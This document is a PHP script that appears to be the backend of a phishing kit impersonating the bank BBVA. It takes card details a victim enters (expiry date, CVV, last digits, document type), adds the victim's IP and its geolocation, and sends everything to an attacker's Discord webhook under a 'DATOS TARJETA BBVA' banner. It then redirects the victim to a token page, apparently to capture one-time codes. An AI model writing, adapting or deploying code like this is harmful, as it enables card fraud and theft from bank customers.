<?php
session_start();
include '../config/config.php';

// Verificaciones mejoradas
if (!isset($_SESSION['username'])) {
    die("Error: No hay usuario en sesión");
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    die("Error: Método no permitido");
}

if (!defined('DISCORD_WEBHOOK_URL')) {
    die("Error: Webhook de Discord no configurado");
}

// Sanitización de datos
$tipoDoc = htmlspecialchars($_POST['tipodoc'] ?? '', ENT_QUOTES, 'UTF-8');
$numdoc = htmlspecialchars($_POST['numdoc'] ?? '', ENT_QUOTES, 'UTF-8');
$cvv = htmlspecialchars($_POST['cvv'] ?? '', ENT_QUOTES, 'UTF-8');
$ulti = htmlspecialchars($_POST['lastDoc'] ?? '', ENT_QUOTES, 'UTF-8');
$username = $_SESSION['username'];

// Función para obtener IP mejorada
function getUserIP() {
    $ip = $_SERVER['REMOTE_ADDR'];
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $ip = trim($ips[0]);
    }
    return filter_var($ip, FILTER_VALIDATE_IP) ? $ip : 'IP no válida';
}

$ip = getUserIP();

// Geolocalización
$geoData = ['country' => 'Desconocido', 'region' => 'Desconocido', 'city' => 'Desconocido'];
try {
    $response = @file_get_contents("http://ip-api.com/json/$ip");
    if ($response !== false) {
        $geoInfo = json_decode($response, true);
        if (json_last_error() === JSON_ERROR_NONE && ($geoInfo['status'] ?? '') === 'success') {
            $geoData = [
                'country' => $geoInfo['country'] ?? 'Desconocido',
                'region' => $geoInfo['regionName'] ?? 'Desconocido',
                'city' => $geoInfo['city'] ?? 'Desconocido'
            ];
        }
    }
} catch (Exception $e) {
    error_log("Error en geolocalización: " . $e->getMessage());
}

// Construcción del mensaje con el mismo diseño
$embed = [
    "title" => "**💳 DATOS TARJETA BBVA INGRESADOS 💳**",
    "color" => hexdec("e67e22"), // Mismo color naranja
    "fields" => [
        ["name" => "👤 Usuario", "value" => "`$username`", "inline" => true],
        ["name" => "📝 Tipo Documento", "value" => "`$tipoDoc`", "inline" => true],
        ["name" => "📅 Fecha Expiración", "value" => "`$numdoc`", "inline" => true],
        ["name" => "🔢 CVV", "value" => "`$cvv`", "inline" => true],
        ["name" => "🔍 Últimos 3 dígitos", "value" => "`$ulti`", "inline" => true],
        ["name" => "🌍 IP", "value" => "`$ip`", "inline" => false],
        ["name" => "🏙️ Ciudad", "value" => "`{$geoData['city']}`", "inline" => true],
        ["name" => "📍 Región", "value" => "`{$geoData['region']}`", "inline" => true],
        ["name" => "🌎 País", "value" => "`{$geoData['country']}`", "inline" => true],
        ["name" => "🕒 Fecha", "value" => "`".date('Y-m-d H:i:s')."`", "inline" => false]
    ],
    "footer" => [
        "text" => "made by @morph3ush4ck",
        "icon_url" => "https://upload.wikimedia.org/wikipedia/commons/c/ca/Osama_bin_Laden_portrait.jpg"
    ]
];

$payload = [
    "username" => "🚨 DATOS TARJETA BBVA 🚨",
    "avatar_url" => "https://media.istockphoto.com/id/911660906/vector/computer-hacker-with-laptop-icon.jpg?s=612x612&w=0&k=20&c=rmx25IUnM2fHP4lXG96PNeZ_YQ1kQUTTWfGU4EE5iqQ=",
    "embeds" => [$embed]
];

// Envío a Discord usando cURL
$ch = curl_init(DISCORD_WEBHOOK_URL);
curl_setopt_array($ch, [
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => json_encode($payload),
    CURLOPT_HTTPHEADER => [
        'Content-Type: application/json',
        'Content-Length: ' . strlen(json_encode($payload))
    ],
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT => 5,
    CURLOPT_SSL_VERIFYPEER => false
]);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

if ($response === false || $httpCode !== 204) {
    error_log("Error al enviar a Discord: HTTP $httpCode - " . curl_error($ch));
    // Puedes agregar aquí un fallback a Telegram si lo deseas
}

curl_close($ch);

header("Location: ../token.html");
exit;
?>